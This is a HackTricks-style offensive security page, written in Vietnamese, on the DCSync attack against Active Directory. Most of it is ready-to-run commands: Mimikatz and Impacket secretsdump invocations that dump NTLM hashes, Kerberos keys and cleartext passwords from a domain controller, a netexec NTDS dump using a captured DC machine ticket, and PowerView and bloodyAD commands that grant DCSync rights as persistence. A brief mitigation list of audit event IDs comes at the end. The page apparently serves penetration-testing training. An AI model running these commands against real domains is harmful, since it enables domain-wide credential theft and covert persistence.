# DCSync

{{#include ../../banners/hacktricks-training.md}}

## DCSync

Quyền **DCSync** đồng nghĩa với việc có các quyền sau trên chính domain: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** và **Replicating Directory Changes In Filtered Set**.<sup>[[3]](#references)</sup>

**Lưu ý quan trọng về DCSync:**

- **Cuộc tấn công DCSync mô phỏng hành vi của Domain Controller và yêu cầu các Domain Controller khác sao chép thông tin** bằng Directory Replication Service Remote Protocol (MS-DRSR). Vì MS-DRSR là một chức năng hợp lệ và cần thiết của Active Directory, không thể tắt hoặc vô hiệu hóa chức năng này.
- Theo mặc định, chỉ các nhóm **Domain Admins, Enterprise Admins, Administrators và Domain Controllers** có các đặc quyền cần thiết.
- Trên thực tế, **DCSync đầy đủ** cần có **`DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`** trên domain naming context. `DS-Replication-Get-Changes-In-Filtered-Set` thường được ủy quyền cùng với các quyền này, nhưng nếu đứng riêng thì quyền này phù hợp hơn với việc đồng bộ **các thuộc tính bí mật / được RODC lọc** (ví dụ: các bí mật kiểu LAPS cũ) thay vì dump krbtgt đầy đủ.<sup>[[2]](#references)</sup>
- Nếu mật khẩu của bất kỳ tài khoản nào được lưu bằng mã hóa có thể đảo ngược, Mimikatz có tùy chọn trả về mật khẩu ở dạng văn bản thuần

### Liệt kê

Kiểm tra ai có các quyền này bằng `powerview`:

```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```

Nếu bạn muốn tập trung vào các **principal không mặc định** có quyền DCSync, hãy lọc bỏ các nhóm tích hợp sẵn có khả năng replication và chỉ xem xét các trustee bất thường:

```powershell
$domainDN = "DC=dollarcorp,DC=moneycorp,DC=local"
$default = "Domain Controllers|Enterprise Domain Controllers|Domain Admins|Enterprise Admins|Administrators"
Get-ObjectAcl -DistinguishedName $domainDN -ResolveGUIDs |
  Where-Object {
    $_.ObjectType -match 'replication-get' -or
    $_.ActiveDirectoryRights -match 'GenericAll|WriteDacl'
  } |
  Where-Object { $_.IdentityReference -notmatch $default } |
  Select-Object IdentityReference,ObjectType,ActiveDirectoryRights
```

### Khai thác cục bộ

```bash
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```

### Khai thác từ xa

```bash
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-ldapfilter '(adminCount=1)'] #Or scope the dump to objects matching an LDAP filter
[-just-dc-ntlm] #Only NTLM material, faster/cleaner when you don't need Kerberos keys
[-pwd-last-set] #To see when each account's password was last changed
[-user-status] #Show if the account is enabled/disabled while dumping
[-history] #To dump password history, may be helpful for offline password cracking
```

Các ví dụ thực tế có phạm vi cụ thể:<sup>[[1]](#references)</sup>

```bash
# Only the krbtgt account
secretsdump.py -just-dc-user krbtgt <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Only privileged objects selected through LDAP
secretsdump.py -just-dc-ntlm -ldapfilter '(adminCount=1)' <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Add metadata and password history for cracking/reuse analysis
secretsdump.py -just-dc-ntlm -history -pwd-last-set -user-status <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>
```

### DCSync bằng TGT của máy DC đã thu thập (ccache)

Khi xem xét một dịch vụ trên bộ điều khiển miền, hãy phân biệt danh tính dịch vụ cục bộ với danh tính mạng của dịch vụ đó. [Microsoft có tài liệu](https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/configure-windows-service-accounts-and-permissions) cho biết các tài khoản ảo của SQL Server (`NT SERVICE\...`) truy cập tài nguyên mạng bằng tài khoản máy chủ của máy chủ đó. Trên bộ điều khiển miền, điều này có thể khiến tài khoản máy DC cần được xem xét khi đánh giá quyền replication, nhưng chỉ có foothold trên dịch vụ không đồng nghĩa với việc có thể xuất TGT của máy hoặc xác thực DCSync. Hãy xác minh danh tính dịch vụ thực tế, ngữ cảnh xác thực outbound, ticket hoặc credentials hiện có, cũng như quyền replication hiệu lực trước khi coi đây là một đường khai thác.

Trong các tình huống unconstrained delegation ở chế độ xuất, bạn có thể thu thập TGT của máy Domain Controller (ví dụ: `DC1$@DOMAIN` cho `krbtgt@DOMAIN`). Sau đó, bạn có thể dùng ccache đó để xác thực với tư cách DC và thực hiện DCSync mà không cần mật khẩu.<sup>[[5]](#references)</sup>

```bash
# Generate a krb5.conf for the realm (helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# netexec helper using KRB5CCNAME
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
  netexec smb <DC_FQDN> --use-kcache --ntds

# Or Impacket with Kerberos from ccache
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
  secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```

Ghi chú vận hành:

- **Luồng Kerberos của Impacket truy cập SMB trước** khi gọi DRSUAPI. Nếu môi trường thực thi **xác thực tên đích SPN**, quá trình dump đầy đủ có thể thất bại với thông báo `Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user`.
- Trong trường hợp đó, hãy yêu cầu vé dịch vụ **`cifs/<dc>`** cho DC đích trước, hoặc dùng **`-just-dc-user`** làm phương án dự phòng để lấy ngay tài khoản cần thiết.
- Khi bạn chỉ có quyền replication thấp hơn, kiểu đồng bộ LDAP/DirSync vẫn có thể làm lộ các thuộc tính **confidential** hoặc **được lọc bởi RODC** (ví dụ thuộc tính cũ `ms-Mcs-AdmPwd`) mà không cần replication đầy đủ krbtgt.<sup>[[2]](#references)</sup>

`-just-dc` tạo 3 tệp:

- một tệp chứa **NTLM hash**
- một tệp chứa **Kerberos key**
- một tệp chứa mật khẩu dạng cleartext từ NTDS của mọi tài khoản được bật [**mã hóa có thể đảo ngược**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption). Bạn có thể tìm người dùng được bật mã hóa có thể đảo ngược bằng lệnh sau:

  ```bash
  Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
  ```

### Persistence

Nếu bạn là quản trị viên miền, bạn có thể cấp các quyền này cho bất kỳ người dùng nào với sự trợ giúp của PowerView:<sup>[[3]](#references)</sup>

```bash
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```

Các operator trên Linux cũng có thể làm điều tương tự bằng `bloodyAD`:

```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' add dcsync <TRUSTEE>
```

Sau đó, bạn có thể **kiểm tra xem người dùng đã được gán chính xác** 3 quyền hay chưa bằng cách tìm chúng trong kết quả đầu ra (bạn sẽ thấy tên các quyền trong trường "ObjectType"):

```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```

### Biện pháp giảm thiểu

- Security Event ID 4662 (phải bật Audit Policy cho đối tượng) – Một thao tác đã được thực hiện trên đối tượng<sup>[[4]](#references)</sup>
- Security Event ID 5136 (phải bật Audit Policy cho đối tượng) – Một đối tượng dịch vụ thư mục đã được sửa đổi
- Security Event ID 4670 (phải bật Audit Policy cho đối tượng) – Quyền trên một đối tượng đã bị thay đổi
- AD ACL Scanner - Tạo và so sánh các báo cáo ACL. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## References

- [1] [Nhật ký thay đổi Impacket](https://github.com/fortra/impacket/blob/master/ChangeLog.md)
- [2] [DirSync: Tận dụng Replication Get-Changes và Get-Changes-In-Filtered-Set](https://simondotsh.com/infosec/2022/07/11/dirsync.html)
- [3] [DCSync: Trích xuất password hash từ Domain Controller](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
- [4] [DCSync](https://yojimbosecurity.ninja/dcsync/)
- [5] [HTB: Delegate — Thông tin xác thực SYSVOL → Targeted Kerberoast → Unconstrained Delegation → DCSync để trở thành DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
{{#include ../../banners/hacktricks-training.md}}
